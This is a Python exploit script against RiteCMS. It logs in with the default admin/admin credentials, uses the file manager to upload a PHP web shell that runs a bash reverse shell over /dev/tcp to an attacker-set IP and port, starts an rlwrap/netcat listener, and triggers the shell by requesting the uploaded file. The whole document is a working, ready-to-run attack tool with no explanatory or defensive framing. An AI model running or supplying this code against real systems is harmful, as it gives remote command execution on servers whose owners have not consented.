import requests
import sys
import subprocess

# Ensure a target IP is provided
if len(sys.argv) != 2:
    print("Usage: python3 ritecms-exploit.py <target-ip>")
    sys.exit()

target_ip = sys.argv[1]
reverse_shell_ip = '192.168.199.130'  # CHANGE THIS
reverse_shell_port = 4444  # CHANGE THIS IF NEEDED

# Prepare URLs and headers
login_url = f'http://{target_ip}/cms/index.php'
upload_url = f'http://{target_ip}/cms/index.php?mode=filemanager&action=upload&directory=media'
execute_url = f'http://{target_ip}/media/rev-shell.php'

headers = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': f'http://{target_ip}',
    'Connection': 'keep-alive',
    'Referer': f'http://{target_ip}/cms/',
    'Upgrade-Insecure-Requests': '1'
}

login_data = {'username': 'admin', 'userpw': 'admin'}
files = {'file': ('rev-shell.php', f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1'\"); ?>", 'application/x-php')}
upload_data = {
    'mode': 'filemanager',
    'directory': 'media',
    'upload_mode': '1',
    'resize_xy': 'x',
    'resize': '640',
    'compression': '80',
    'thumbnail_resize_xy': 'x',
    'thumbnail_resize': '150',
    'thumbnail_compression': '70',
    'upload_file_submit': 'OK - Upload file'
}

with requests.Session() as session:
    # Send POST request to log in
    if session.post(login_url, headers=headers, data=login_data).ok:
        print("[*] AUTHENTICATION BYPASSED!")

        # Send POST request to upload the file
        if session.post(upload_url, headers=headers, files=files, data=upload_data).ok:
            print("[*] REVERSE SHELL UPLOADED!")

            # Print and execute the Netcat listener command
            listener_command = f"rlwrap nc -nlvp {reverse_shell_port}"
            print(f"\n[*] STARTING NETCAT LISTNER:\n{listener_command}")

            # Execute the Netcat listener command
            subprocess.Popen(listener_command, shell=True)
            
            # Execute the uploaded reverse shell file
            if session.get(execute_url).ok:
                print("[*] EXECUTE SUCCESSFUL!")
            else:
                print("[x] EXECUTE FAILED!")
        else:
            print("[x] UPLOAD FAILED!")
    else:
        print("[x] LOGIN FAILED!")
